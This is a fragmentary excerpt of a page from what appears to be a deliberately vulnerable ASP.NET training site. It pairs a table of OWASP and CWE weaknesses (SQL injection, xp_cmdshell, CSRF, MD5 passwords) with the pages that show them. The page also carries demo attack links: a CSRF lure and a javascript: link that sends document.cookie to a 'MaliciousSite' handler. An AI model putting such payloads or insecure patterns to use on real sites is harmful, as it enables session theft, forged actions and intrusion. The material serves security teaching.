...
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Insecure: <a href="Login.aspx">Login</a> 
        | <a href="Register.aspx">Register</a> 
        | <a href="Register1.aspx"> Register1</a>
        | <a href="FileUpload.aspx">File Upload</a> 
...
&nbsp;
    ...
    <a href="http://localhost:50309/MaliciousSite/XSRFDeleteUser.htm">OMG, You must check this out. This site has a very bad review about your site! (CSRF)</a>
    <form action="http://localhost:50309/MaliciousSite/Default.aspx" name="MaliciousForm" method="get">
    ...
    <p style="font-family: Arial, Helvetica, sans-serif; font-size: small">
        <a href="javascript:document.forms['MaliciousForm'].MaliciousControl.value=document.cookie; document.forms['MaliciousForm'].submit();">Free Stuff Hurry Up... (cookie)</a></p>
    ...
    <table border="1" 
        style="width:100%; font-family: Arial, Helvetica, sans-serif; font-size: small;">
            ...
            <tr>
                ...
                <td>
                    A1, B2, B4, B14:
                    Default (search), Product; (Failure to preserve web page structure)<br />
            ...
            <tr>
                ...
                <td>
                    A2, B1, B3:
                    Login; (Failure to preserve SQL Query structure)<br />
            ...
            <tr>
                ...
                <td>
                    A3, B5: Login (mssql: master.dbo.xp_cmdshell 
        injection)<br />
                    A3, B12: File Upload<br /></td>
                <td>
            ...
            <tr>
                ...
                <td>
                    A4:
                    Account.aspx?username=admin (after login)</td>
                <td>
            ...
            <tr>
                ...
                <td>
                    A5, B7:
                    Admin/Admin.aspx (during admin login) 
                    MailciousSite/XSRFDeleteUser.htm has the malicious code for CSRF - may need to change 
        url/port info on link to match with the vulnerable site)</td>
                <td>
                    1. Eliminate all XSS<br />
                    2. Do not allow GET requests for sensitive actions<br />
                    3. Re-authenticate or digitally sign transaction </td>
            </tr>
            <tr>
                <td>
            ...
            <tr>
                ...
                <td>
                     A7, B19:
                     SecureAdmin.aspx (authenticated) -&gt; DeleteUser1.aspx 
        (unauthticated page);<br />
                     ...
                     B11: Login.aspx (cookies) -&gt; Default.aspx (click a link)<br />
            ...
            <tr>
                ...
                <td>
                     A8:
                     Register (plain text password, MD5)</td>
                <td>
                     1. Avoid storing sensitive information when possible<br />
                     2. Use only approved standard algorithms such as SHA1, SHA2 </td>
            </tr>
            <tr>
                <td>
    ...
    <p>
        ...
        <span class="style14">B10: Failure to Constrain Operations within the Bounds of Memory Buffer (aka 
        Buffer Overflow)</span><b><br class="style13" />
